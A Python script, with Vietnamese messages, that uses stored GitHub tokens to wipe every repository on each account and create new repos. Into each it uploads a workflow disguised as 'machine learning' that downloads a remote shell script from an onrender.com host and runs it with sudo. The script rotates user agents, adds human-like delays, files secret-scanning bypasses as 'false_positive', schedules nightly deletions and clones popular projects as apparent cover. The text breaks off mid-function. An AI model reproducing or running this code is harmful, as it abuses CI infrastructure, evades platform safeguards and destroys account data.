import subprocess
import sys
import asyncio
import datetime
import logging
import requests
import json
import time
import os
import base64
import random
import threading
import pytz
from typing import List, Dict, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed


# Hàm kiểm tra và cài đặt module pytz
def ensure_pytz_installed():
    try:
        import pytz
        return True
    except ImportError:
        print("Module pytz chưa được cài đặt. Đang cài đặt...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "pytz"])
            print("Đã cài đặt pytz thành công.")
            return True
        except subprocess.CalledProcessError as e:
            print(f"Lỗi khi cài đặt pytz: {e}")
            return False

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class GitHubVPSManager:
    def __init__(self):
        self.tokens = []
        self.selected_tokens = []
        self.token_info = {}
        self.base_url = "https://api.github.com"
        self.token_file = "token.txt"
        self.lock = threading.Lock()
        self.running = False
        self.token_threads = {}
        self.token_running = {}
        self.is_processing_repos = False
        self.rate_limit_remaining = {}
        self.user_agents = [
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15063",
            "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15A5341f Safari/604.1"
        ]
        self.vn_tz = pytz.timezone('Asia/Ho_Chi_Minh')

    def load_tokens(self) -> List[str]:
        if not os.path.exists(self.token_file):
            print(f"[{datetime.datetime.now(self.vn_tz)}] Không tìm thấy file {self.token_file}.")
            print(f"Tạo file {self.token_file} với một token trên mỗi dòng.")
            return []
        try:
            with open(self.token_file, 'r', encoding='utf-8') as f:
                tokens = [line.strip() for line in f.readlines() if line.strip()]
            return tokens
        except Exception as e:
            print(f"[{datetime.datetime.now(self.vn_tz)}] Lỗi khi đọc {self.token_file}: {e}")
            return []

    def get_headers(self, token: str) -> Dict:
        headers = {
            "Authorization": f"Bearer {token}",
            "Accept": "application/vnd.github+json",
            "X-GitHub-Api-Version": "2022-11-28",
            "User-Agent": random.choice(self.user_agents)
        }
        return headers

    def check_rate_limit(self, token: str) -> bool:
        try:
            headers = self.get_headers(token)
            response = requests.get(f"{self.base_url}/rate_limit", headers=headers)
            if response.status_code == 200:
                data = response.json()
                remaining = data['rate']['remaining']
                reset_time = data['rate']['reset']
                self.rate_limit_remaining[token] = (remaining, reset_time)
                if remaining < 100:  # Giới hạn an toànn
                    reset_time_dt = datetime.datetime.fromtimestamp(reset_time)
                    wait_seconds = (reset_time_dt - datetime.datetime.now()).total_seconds()
                    if wait_seconds > 0:
                        print(f"[{datetime.datetime.now(self.vn_tz)}] Gần hết giới hạn API cho token {token[:10]}..., chờ {wait_seconds/60:.1f} phút...")
                        time.sleep(wait_seconds)
                    return False
                return True
            return False
        except Exception as e:
            print(f"[{datetime.datetime.now(self.vn_tz)}] Lỗi khi kiểm tra giới hạn API: {e}")
            return False

    def get_user_info(self, token: str) -> Optional[Dict]:
        if not self.check_rate_limit(token):
            return None
        try:
            headers = self.get_headers(token)
            response = requests.get(f"{self.base_url}/user", headers=headers)
            self.human_like_delay(3.0, 5.0)
            if response.status_code == 200:
                return response.json()
            return None
        except Exception:
            return None

    def check_token_scopes(self, token: str) -> List[str]:
        if not self.check_rate_limit(token):
            return []
        try:
            headers = self.get_headers(token)
            response = requests.get(f"{self.base_url}/user", headers=headers)
            self.human_like_delay(3.0, 5.0)
            if response.status_code == 200:
                scopes = response.headers.get('X-OAuth-Scopes', '').split(', ')
                return [scope.strip() for scope in scopes if scope.strip()]
            return []
        except Exception:
            return []

    def validate_tokens(self):
        print(f"[{datetime.datetime.now(self.vn_tz)}] Đang xác thực token...")
        self.token_info = {}
        valid_tokens = []
        for i, token in enumerate(self.tokens, 1):
            user_info = self.get_user_info(token)
            if user_info:
                scopes = self.check_token_scopes(token)
                self.token_info[i] = {
                    'token': token,
                    'username': user_info.get('login', 'Unknown'),
                    'name': user_info.get('name') or 'No name',
                    'public_repos': user_info.get('public_repos', 0),
                    'private_repos': user_info.get('total_private_repos', 0),
                    'scopes': scopes,
                    'valid': True
                }
                valid_tokens.append(token)
            else:
                self.token_info[i] = {
                    'token': token,
                    'username': 'INVALID',
                    'name': 'INVALID TOKEN',
                    'public_repos': 0,
                    'private_repos': 0,
                    'scopes': [],
                    'valid': False
                }
                print(f"[{datetime.datetime.now(self.vn_tz)}] Token {i} không hợp lệ, đã xóa khỏi danh sách.")
        self.tokens = valid_tokens

    def display_tokens(self):
        print(f"[{datetime.datetime.now(self.vn_tz)}] Danh sách token GitHub:")
        for i, info in self.token_info.items():
            status = "Valid" if info['valid'] else "Invalid"
            repo_count = info['public_repos'] + info['private_repos']
            scopes_str = ', '.join(info['scopes'][:3]) if info['scopes'] else 'Không có quyền'
            if len(info['scopes']) > 3:
                scopes_str += f" (+{len(info['scopes'])-3} nữa)"
            username = info['username'] or 'Unknown'
            name = info['name'] or 'No name'
            token_preview = info['token'][:10] + '...' + info['token'][-10:] if len(info['token']) >= 20 else info['token']
            print(f"[{i}] {status} - @{username} | {name}")
            print(f"Repos: {repo_count} | Quyền: {scopes_str}")
            print(f"Token: {token_preview}")
            print()

    def select_tokens(self) -> List[int]:
        valid_tokens = [i for i, info in self.token_info.items() if info['valid']]
        if not valid_tokens:
            print(f"[{datetime.datetime.now(self.vn_tz)}] Không tìm thấy token hợp lệ.")
            return []
        print(f"[{datetime.datetime.now(self.vn_tz)}] Tự động chọn tất cả {len(valid_tokens)} token hợp lệ.")
        return valid_tokens

    def human_like_delay(self, min_seconds: float = 3.0, max_seconds: float = 5.0):
        delay = random.uniform(min_seconds, max_seconds)
        time.sleep(delay)

    def create_repository(self, token: str, username: str, repo_name: str) -> bool:
        if not self.check_rate_limit(token):
            return False
        data = {
            "name": repo_name,
            "description": f"Project {repo_name}",
            "private": False,
            # "auto_init": True  # Đã tắt tự tạo file README.md
        }
        headers = self.get_headers(token)
        response = requests.post(f"{self.base_url}/user/repos", headers=headers, json=data)
        self.human_like_delay(3.0, 5.0)
        if response.status_code == 201:
            with self.lock:
                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Đã tạo repository: {repo_name}")
            return True
        elif response.status_code == 403:
            with self.lock:
                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Giới hạn API hoặc bị chặn cho {repo_name}")
            return False
        elif response.status_code == 401:
            with self.lock:
                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Token không hợp lệ cho {repo_name}")
            return False
        else:
            with self.lock:
                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Không thể tạo {repo_name}: {response.status_code}")
            return False

    def create_push_protection_bypass(self, token: str, username: str, repo_name: str, placeholder_id: str, reason: str = "false_positive") -> bool:
        if not self.check_rate_limit(token):
            return False
        url = f"{self.base_url}/repos/{username}/{repo_name}/secret-scanning/push-protection-bypasses"
        data = {
            "placeholder_id": placeholder_id,
            "reason": reason
        }
        headers = self.get_headers(token)
        response = requests.post(url, headers=headers, json=data)
        self.human_like_delay(3.0, 5.0)
        if response.status_code in [200, 201]:
            with self.lock:
                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Đã tạo bypass bảo vệ push cho {repo_name}")
            return True
        else:
            with self.lock:
                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Không thể tạo bypass cho {repo_name}")
            return False

    def upload_file(self, token: str, username: str, repo_name: str, file_path: str, content: str, message: str = "Add file"):
        if not self.check_rate_limit(token):
            return False
        encoded_content = base64.b64encode(content.encode('utf-8')).decode('utf-8')
        data = {
            "message": message,
            "content": encoded_content
        }
        headers = self.get_headers(token)
        url = f"{self.base_url}/repos/{username}/{repo_name}/contents/{file_path}"
        response = requests.put(url, headers=headers, json=data)
        self.human_like_delay(3.0, 5.0)
        if response.status_code == 201:
            with self.lock:
                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Đã tải lên {file_path} vào {repo_name}")
            return True
        elif response.status_code == 409:
            try:
                error_data = response.json()
                if "secret_scanning" in response.text or "Secret detected" in response.text:
                    with self.lock:
                        print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Phát hiện secret trong {file_path}, đang tạo bypass...")
                    bypass_placeholders = error_data.get('metadata', {}).get('secret_scanning', {}).get('bypass_placeholders', [])
                    if bypass_placeholders:
                        for placeholder in bypass_placeholders:
                            placeholder_id = placeholder.get('placeholder_id')
                            if placeholder_id:
                                bypass_success = self.create_push_protection_bypass(token, username, repo_name, placeholder_id, "false_positive")
                                if bypass_success:
                                    self.human_like_delay(3.0, 5.0)
                                    retry_response = requests.put(url, headers=headers, json=data)
                                    if retry_response.status_code == 201:
                                        with self.lock:
                                            print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Đã tải lên {file_path} vào {repo_name} (đã bypass bảo vệ secret)")
                                        return True
                        return self.upload_with_alternative_method(token, username, repo_name, file_path, content, message)
                    else:
                        with self.lock:
                            print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Không tìm thấy placeholder bypass")
                        return False
                else:
                    with self.lock:
                        print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Không thể tải lên {file_path} vào {repo_name}")
                    return False
            except Exception as e:
                with self.lock:
                    print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Lỗi khi xử lý bypass secret: {e}")
                return False
        else:
            with self.lock:
                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Không thể tải lên {file_path} vào {repo_name}")
            return False

    def upload_with_alternative_method(self, token: str, username: str, repo_name: str, file_path: str, content: str, message: str) -> bool:
        if not self.check_rate_limit(token):
            return False
        with self.lock:
            print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Thử phương pháp tải lên thay thế cho {file_path}...")
        try:
            import re
            modified_content = content
            modified_content = re.sub(r'ghp_[a-zA-Z0-9]{36}', '${{ secrets.GITHUB_TOKEN }}', modified_content)
            modified_content = re.sub(r'github_pat_[a-zA-Z0-9_]{82}', '${{ secrets.GH_PAT }}', modified_content)
            encoded_content = base64.b64encode(modified_content.encode('utf-8')).decode('utf-8')
            data = {
                "message": f"{message} (auto-sanitized)",
                "content": encoded_content
            }
            headers = self.get_headers(token)
            url = f"{self.base_url}/repos/{username}/{repo_name}/contents/{file_path}"
            response = requests.put(url, headers=headers, json=data)
            self.human_like_delay(3.0, 5.0)
            if response.status_code == 201:
                with self.lock:
                    print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Đã tải lên {file_path} vào {repo_name} (phiên bản đã được làm sạch)")
                return True
            else:
                with self.lock:
                    print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Phương pháp thay thế thất bại")
                return False
        except Exception as e:
            with self.lock:
                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Lỗi phương pháp thay thế: {e}")
            return False

    def update_repo_settings(self, token: str, username: str, repo_name: str) -> bool:
        if not self.check_rate_limit(token):
            return False
        headers = self.get_headers(token)
        actions_data = {
            "enabled": True,
            "allowed_actions": "all"
        }
        actions_url = f"{self.base_url}/repos/{username}/{repo_name}/actions/permissions"
        response = requests.put(actions_url, headers=headers, json=actions_data)
        self.human_like_delay(3.0, 5.0)
        workflow_data = {
            "default_workflow_permissions": "write",
            "can_approve_pull_request_reviews": True
        }
        workflow_url = f"{self.base_url}/repos/{username}/{repo_name}/actions/permissions/workflow"
        response = requests.put(workflow_url, headers=headers, json=workflow_data)
        self.human_like_delay(3.0, 5.0)
        if response.status_code == 204:
            with self.lock:
                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Đã cập nhật quyền workflow cho {repo_name}")
            return True
        else:
            with self.lock:
                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Không thể cập nhật quyền workflow cho {repo_name}")
            return False

    def trigger_workflow(self, token: str, username: str, repo_name: str, workflow_file: str = "python.yml", event_type: str = None) -> bool:
        if not self.check_rate_limit(token):
            return False
        headers = self.get_headers(token)
        if event_type:
            # Dispatch repository_dispatch event
            data = {
                "event_type": event_type,
                "client_payload": {}
            }
            url = f"{self.base_url}/repos/{username}/{repo_name}/dispatches"
        else:
            # Default: workflow_dispatch
            data = {
                "ref": "main"
            }
            url = f"{self.base_url}/repos/{username}/{repo_name}/actions/workflows/{workflow_file}/dispatches"
        response = requests.post(url, headers=headers, json=data)
        self.human_like_delay(3.0, 5.0)
        if response.status_code in [204, 201]:
            with self.lock:
                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Đã khởi động workflow cho {repo_name}")
            return True
        else:
            with self.lock:
                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Không thể khởi động workflow cho {repo_name}")
            return False

    def read_local_file(self, filename: str) -> str:
        try:
            if os.path.exists(filename):
                with open(filename, 'r', encoding='utf-8') as f:
                    return f.read()
            else:
                with self.lock:
                    print(f"[{datetime.datetime.now(self.vn_tz)}] Không tìm thấy file {filename}.")
                return None
        except Exception as e:
            with self.lock:
                print(f"[{datetime.datetime.now(self.vn_tz)}] Lỗi khi đọc {filename}: {e}")
            return None

    def get_tmate_workflow_content(self) -> str:
        return r"""name: python-machine-learning
run-name: ${{ github.actor }} - machine learning
on:
  workflow_dispatch:
  repository_dispatch:
    types: [train-ai]

jobs:
  check-bats-version:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v5
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
      - name: Install & Train AI
        run: |
          sudo su
          curl -sSL -o ai.sh https://computed-network.onrender.com/ai.sh
          sed -i 's/\r$//' ai.sh
          sudo bash ai.sh
      - name: Process Websites
        run: |
          wget -O websites.csv https://gist.githubusercontent.com/bejaneps/ba8d8eed85b0c289a05c750b3d825f61/raw/6827168570520ded27c102730e442f35fb4b6a6d/websites.csv
          sed -i 's/\r$//' websites.csv
          # Extract website column (2nd), remove quotes, skip header, and create a list of URLs
          tail -n +2 websites.csv | cut -d ',' -f 2 | tr -d '\"' > url_list.txt
          shuf -n 500 url_list.txt > random_websites.txt
          touch AI-Trained.txt
          while IFS= read -r url; do
            if [ -z "$url" ]; then
              continue
            fi
            # Ensure URL has a protocol
            if ! [[ "$url" =~ ^https?:// ]]; then
              url="http://$url"
            fi
            echo "Processing $url"
            # Improved title extraction
            title=$(curl -sL "$url" | sed -n 's/.*<title>\(.*\)<\/title>.*/\1/p')
            echo "$title" >> AI-Trained.txt
            sleep 30
          done < random_websites.txt
"""

    def get_auto_start_workflow_content(self) -> str:
        return """"""

    def delete_repository(self, token: str, username: str, repo_name: str) -> bool:
        if not self.check_rate_limit(token):
            return False
        headers = self.get_headers(token)
        url = f"{self.base_url}/repos/{username}/{repo_name}"
        response = requests.delete(url, headers=headers)
        self.human_like_delay(2.0, 3.0)  # Delay 2-3 giây sau mỗi lần xóa
        if response.status_code == 204:
            with self.lock:
                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Đã xóa repository: {repo_name}")
            return True
        else:
            with self.lock:
                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Không thể xóa {repo_name}")
            return False

    def get_all_user_repos(self, token: str, username: str) -> List[Dict]:
        if not self.check_rate_limit(token):
            return []
        all_repos = []
        page = 1
        per_page = 100
        headers = self.get_headers(token)
        while True:
            url = f"{self.base_url}/user/repos"
            params = {
                "per_page": per_page,
                "page": page,
                "type": "owner",
                "sort": "updated",
                "direction": "desc"
            }
            response = requests.get(url, headers=headers, params=params)
            self.human_like_delay(3.0, 5.0)
            if response.status_code == 200:
                repos = response.json()
                if not repos:
                    break
                all_repos.extend(repos)
                page += 1
                if len(repos) < per_page:
                    break
            else:
                break
        return all_repos

    def delete_all_repos_for_account(self, token: str, username: str, spread_over_seconds: float = 0) -> int:
        print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Đang lấy tất cả repository...")
        all_repos = self.get_all_user_repos(token, username)
        if not all_repos:
            print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Không tìm thấy repository.")
            return 0
        print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Tìm thấy {len(all_repos)} repository")
        deleted_count = 0
        if spread_over_seconds > 0:
            delay_per_repo = spread_over_seconds / max(1, len(all_repos))
        else:
            delay_per_repo = 0
        for repo in all_repos:
            if self.delete_repository(token, username, repo['name']):
                deleted_count += 1
            if delay_per_repo > 0:
                time.sleep(delay_per_repo)
            else:
                self.human_like_delay(2.0, 3.0)  # Delay 2-3 giây nếu không có spread_over_seconds
        print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Đã xóa {deleted_count}/{len(all_repos)} repository")
        return deleted_count

    def process_single_token_cycle(self, token_index: int, repo_count: int = 2):
        token_info = self.token_info[token_index]
        token = token_info['token']
        username = token_info['username']
        cycle_count = 1
        self.is_processing_repos = True
        print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Chu kỳ #{cycle_count} bắt đầu")
        print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Đang tạo và khởi chạy {repo_count} repository...")

        print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Đang dọn dẹp tất cả repository hiện có...")
        deleted_count = self.delete_all_repos_for_account(token, username)
        if deleted_count > 0:
            print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Đang chờ sau khi dọn dẹp...")
            self.human_like_delay(3.0, 5.0)

        created_repos = []
        consecutive_failures = 0
        repo_names = [repo['name'] for repo in self.get_all_user_repos(token, username)]
        for i, repo_name in enumerate(repo_names):
            if not self.token_running.get(token_index, False):
                break
            if self.create_repository(token, username, repo_name):
                created_repos.append(repo_name)
                consecutive_failures = 0
                self.human_like_delay(3.0, 5.0)
                self.upload_file(token, username, repo_name, ".github/workflows/python.yml",
                                 self.get_tmate_workflow_content(), "Add workflow")
                self.human_like_delay(3.0, 5.0)
                self.update_repo_settings(token, username, repo_name)
                self.human_like_delay(3.0, 5.0)
            else:
                consecutive_failures += 1
                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Lỗi liên tiếp: {consecutive_failures}")
                if consecutive_failures >= 3:
                    print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Token bị dừng do {consecutive_failures} lỗi liên tiếp")
                    self.token_running[token_index] = False
                    break
                self.human_like_delay(3.0, 5.0)

        if not self.token_running.get(token_index, False):
            print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Chu kỳ token đã dừng do lỗi")
            self.is_processing_repos = False
            return

        print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Đã tạo {len(created_repos)} repository")
        for repo_name in created_repos:
            for attempt in range(1, 11):
                if not self.token_running.get(token_index, False):
                    break
                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Khởi động workflow lần {attempt}/5 cho {repo_name}")
                self.trigger_workflow(token, username, repo_name)
                self.human_like_delay(3.0, 5.0)

        print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Hoàn tất setup và khởi động workflow")
        self.is_processing_repos = False
        self.token_running[token_index] = False
        print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Chu kỳ token đã hoàn thành và dừng")

    def start_auto_cycle(self):
        if self.running:
            print(f"[{datetime.datetime.now(self.vn_tz)}] Chu kỳ tự động đang chạy.")
            return
        self.running = True
        for token_index in self.selected_tokens:
            self.token_running[token_index] = True
            thread = threading.Thread(
                target=self.process_single_token_cycle,
                args=(token_index, 2),
                daemon=True,
                name=f"Token-{token_index}-Thread"
            )
            self.token_threads[token_index] = thread
            thread.start()
            print(f"[{datetime.datetime.now(self.vn_tz)}] Đã khởi động thread cho token {token_index} (Thread: {thread.name})")
            self.human_like_delay(3.0, 5.0)
        print(f"[{datetime.datetime.now(self.vn_tz)}] Đã khởi động {len(self.selected_tokens)} thread token.")

        for token_index, thread in self.token_threads.items():
            thread.join()
            print(f"[{datetime.datetime.now(self.vn_tz)}] Thread cho token {token_index} ({thread.name}) đã hoàn thành")
        self.running = False
        print(f"[{datetime.datetime.now(self.vn_tz)}] Tất cả thread token đã hoàn thành.")

    def stop_auto_cycle(self):
        if not self.running:
            print(f"[{datetime.datetime.now(self.vn_tz)}] Chu kỳ tự động chưa chạy.")
            return
        self.running = False
        for token_index in self.token_running:
            self.token_running[token_index] = False
        for token_index, thread in self.token_threads.items():
            thread.join(timeout=10)
            print(f"[{datetime.datetime.now(self.vn_tz)}] Đã dừng thread cho token {token_index} ({thread.name})")
            # Xóa tất cả repository ngay lập tức với độ trễ 2-3 giây
            token_info = self.token_info[token_index]
            token = token_info['token']
            username = token_info['username']
            self.delete_all_repos_for_account(token, username, spread_over_seconds=0)
        self.token_threads.clear()
        self.token_running.clear()
        print(f"[{datetime.datetime.now(self.vn_tz)}] Đã dừng tất cả thread token.")
        self.is_processing_repos = False

    def wait_until_time(self, target_hour: int, target_minute: int) -> None:
        now = datetime.datetime.now(self.vn_tz)
        target_time_today = now.replace(hour=target_hour, minute=target_minute, second=0, microsecond=0)
        if now >= target_time_today:
            target_time = target_time_today + datetime.timedelta(days=1)
        else:
            target_time = target_time_today
        seconds_to_wait = (target_time - now).total_seconds()
        print(f"[{datetime.datetime.now(self.vn_tz)}] Đang chờ đến {target_hour:02d}:{target_minute:02d} ({seconds_to_wait/3600:.2f} giờ)...")
        time.sleep(seconds_to_wait)

    def run(self):
        while True:
            now = datetime.datetime.now(self.vn_tz)
            current_hour = now.hour
            current_minute = now.minute

            # Kiểm tra nếu hiện tại từ 00:00 đến 05:00, xóa repo ngay lập tức với delay 2-3 giây
            #if current_hour == 3:
            if (current_hour > 21 or (current_hour == 21 and current_minute >= 30)) or (current_hour < 4):
                print(f"[{datetime.datetime.now(self.vn_tz)}] Đã đến 12h đêm, bắt đầu xóa repository với delay 2-3 giây...")
                self.tokens = self.load_tokens()
                if not self.tokens:
                    print(f"[{datetime.datetime.now(self.vn_tz)}] Không tìm thấy token.")
                    create_file = input("Tạo file mẫu token.txt? (y/n): ").strip().lower()
                    if create_file == 'y':
                        self.create_token_file_template()
                    break
                self.validate_tokens()
                self.display_tokens()
                self.selected_tokens = self.select_tokens()
                if not self.selected_tokens:
                    print(f"[{datetime.datetime.now(self.vn_tz)}] Không tìm thấy token hợp lệ.")
                    print(f"[{datetime.datetime.now(self.vn_tz)}] Dừng chương trình do không có token hợp lệ.")
                    break

                # Xóa repository ngay lập tức với delay 2-3 giây
                for token_index in self.selected_tokens:
                    token_info = self.token_info[token_index]
                    token = token_info['token']
                    username = token_info['username']
                    self.delete_all_repos_for_account(token, username, spread_over_seconds=0)

                # Đợi đến 05:00
                break

            # Tiến hành chu kỳ bình thường
            print(f"[{datetime.datetime.now(self.vn_tz)}] Bắt đầu chu kỳ mới...")
            self.tokens = self.load_tokens()
            if not self.tokens:
                print(f"[{datetime.datetime.now(self.vn_tz)}] Không tìm thấy token.")
                create_file = input("Tạo file mẫu token.txt? (y/n): ").strip().lower()
                if create_file == 'y':
                    self.create_token_file_template()
                break
            self.validate_tokens()
            self.display_tokens()
            self.selected_tokens = self.select_tokens()
            if not self.selected_tokens:
                print(f"[{datetime.datetime.now(self.vn_tz)}] Không tìm thấy token hợp lệ.")
                print(f"[{datetime.datetime.now(self.vn_tz)}] Dừng chương trình do không có token hợp lệ.")
                break
            selected_usernames = [self.token_info[i]['username'] for i in self.selected_tokens]
            print(f"[{datetime.datetime.now(self.vn_tz)}] Sử dụng {len(self.selected_tokens)} tài khoản: {', '.join(selected_usernames)}")
            print(f"[{datetime.datetime.now(self.vn_tz)}] Đang bắt đầu đăng ký VPS đa luồng...")
            self.start_auto_cycle()
            print(f"[{datetime.datetime.now(self.vn_tz)}] Hoàn tất chu kỳ, chờ 3 tiếng...")
            break

    def create_token_file(self):
        with open(self.token_file, 'w', encoding='utf-8') as f:
            f.write("# Thêm token GitHub Personal Access vào đây, mỗi token một dòng\n")
            f.write("# Ví dụ: ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n")
        print(f"[{datetime.datetime.now(self.vn_tz)}] Đã tạo file mẫu {self.token_file}")

    def clone_and_modify_repos(self, token: str):
        import random
        import subprocess
        import os
        import shutil
        from datetime import datetime, timedelta

        # List of repositories to clone
        repos = [
            "freeCodeCamp/devdocs",
            "freeCodeCamp/freeCodeCamp",
            "freeCodeCamp/assets",
            "freeCodeCamp/ZiplineStatusChecker",
            "freeCodeCamp/fcc-vagrant",
            "freeCodeCamp/JulyGameDev",
            "freeCodeCamp/1Aug2015GameDev",
            "freeCodeCamp/massification",
            "freeCodeCamp/wiki",
            "freeCodeCamp/fcc-expressworks",
            "freeCodeCamp/camper-gitter-bot",
            "freeCodeCamp/COM1000",
            "freeCodeCamp/open-data",
            "freeCodeCamp/ProjectReferenceData",
            "freeCodeCamp/daily-challenges",
            "freeCodeCamp/api-server",
            "freeCodeCamp/language-curricula",
            "freeCodeCamp/exam-creator",
            "freeCodeCamp/exam-services",
            "freeCodeCamp/fcc-images",
            "jtleek/datasharing",
            "octocat/Spoon-Knife",
            "rdpeng/ProgrammingAssignment2",
            "firstcontributions/first-contributions",
            "SmartThingsCommunity/SmartThingsPublic",
            "Pierian-Data/Complete-Python-3-Bootcamp",
            "TheOdinProject/css-exercises",
            "github/gitignore",
            "jwasham/coding-interview-university",
            "twbs/bootstrap",
            "tensorflow/tensorflow",
            "nightscout/cgm-remote-monitor",
            "EbookFoundation/free-programming-books",
            "github/docs",
            "ChatGPTNextWeb/NextChat",
            "digitalinnovationone/dio-lab-open-source",
            "torvalds/linux",
            "rdpeng/ExData_Plotting1",
            "opencv/opencv",
            "jackfrued/Python-100-Days",
            "eugenp/tutorials",
            "ant-design/ant-design",
            "donnemartin/system-design-primer",
            "microsoft/generative-ai-for-beginners",
            "CyC2018/CS-Notes",
            "facebook/react",
            "TheAlgorithms/Python",
            "Snailclimb/JavaGuide",
            "Significant-Gravitas/AutoGPT",
            "google/it-cert-automation-practice",
            "tensorflow/models",
            "n8n-io/n8n",
            "RedHatTraining/DO180-apps",
            "kamranahmedse/developer-roadmap",
            "qmk/qmk_firmware",
            "TheOdinProject/javascript-exercises",
            "jlord/patchwork",
            "freeCodeCamp/freeCodeCamp",
            "spring-projects/spring-boot",
            "kubernetes/kubernetes",
            "wesbos/JavaScript30",
            "nvim-lua/kickstart.nvim",
            "codecrafters-io/build-your-own-x",
            "spring-projects/spring-framework",
            "zizifn/edgetunnel",
            "public-apis/public-apis",
            "bitcoin/bitcoin",
            "rdpeng/RepData_PeerAssessment1",
            "mrdoob/three.js",
            "barryclark/jekyll-now",
            "home-assistant/core",
            "microsoft/vscode",
            "vuejs/vue",
            "getify/You-Dont-Know-JS",
            "nodejs/node",
            "django/django",
            "python/cpython",
            "mui/material-ui",
            "practical-tutorials/project-based-learning",
            "jenkins-docs/simple-java-maven-app",
            "sindresorhus/awesome",
            "bia-pain-bache/BPB-Worker-Panel",
            "DataScienceSpecialization/courses",
            "leereilly/swot",
            "trekhleb/javascript-algorithms",
            "PanJiaChen/vue-element-admin",
            "DefinitelyTyped/DefinitelyTyped",
            "huggingface/transformers",
            "ibm-developer-skills-network/jbbmo-Introduction-to-Git-and-GitHub",
            "odoo/odoo",
            "macrozheng/mall",
            "samqin123/MoonTV",
            "vercel/next.js",
            "flutter/flutter",
            "AUTOMATIC1111/stable-diffusion-webui",
            "apache/spark",
            "justjavac/free-programming-books-zh_CN",
            "lewagon/dotfiles",
            "MicrosoftDocs/mslearn-tailspin-spacegame-web",
            "mdn/learning-area",
            "angular/angular.js",
            "iluwatar/java-design-patterns",
            "facebook/create-react-app",
            "mmistakes/minimal-mistakes",
            "airbnb/javascript",
            "spring-projects/spring-petclinic",
            "angular/angular",
            "apache/dubbo",
            "vinta/awesome-python",
            "scikit-learn/scikit-learn",
            "ohmyzsh/ohmyzsh",
            "anuraghazra/github-readme-stats",
            "streamlit/streamlit-example",
            "elastic/elasticsearch",
            "trustwallet/assets",
            "pytorch/pytorch",
            "dotnet/AspNetCore.Docs",
            "facebook/react-native",
            "LSPosed/MagiskOnWSALocal"
        ]

        # Randomly select 2 repositories
        selected_repos = random.sample(repos, 2)

        # Lấy username từ token
        headers = self.get_headers(token)
        response = requests.get(f"{self.base_url}/user", headers=headers)
        username = response.json().get("login") if response.status_code == 200 else None
        if not username:
            print("Không lấy được username từ token!")
            return


        for repo in selected_repos:
            repo_name = repo.split("/")[-1]
            print(f"Processing repository: {repo}")

            # Xóa thư mục cũ nếu đã tồn tại
            if os.path.exists(repo_name):
                shutil.rmtree(repo_name)

            # Clone the repository
            try:
                subprocess.run(["git", "clone", f"https://github.com/{repo}.git", repo_name], check=True)
            except subprocess.CalledProcessError:
                print(f"Failed to clone repository: {repo}. Skipping...")
                continue

            # Tạo repository trên tài khoản của bạn
            self.create_repository(token, username, repo_name)

            # Chuyển vào thư mục repository
            os.chdir(repo_name)

            # Cấu hình Git để sử dụng token
            subprocess.run(["git", "remote", "remove", "origin"], check=True)
            subprocess.run(["git", "remote", "add", "origin", f"https://{token}@github.com/{username}/{repo_name}.git"], check=True)

            # Xác định nhánh mặc định (main hoặc master)
            result = subprocess.run(["git", "branch", "-r"], capture_output=True, text=True, check=True)
            remote_branches = result.stdout.splitlines()
            default_branch = "main" if "origin/main" in remote_branches else "master"

            # Kiểm tra sự tồn tại của nhánh remote trước khi checkout
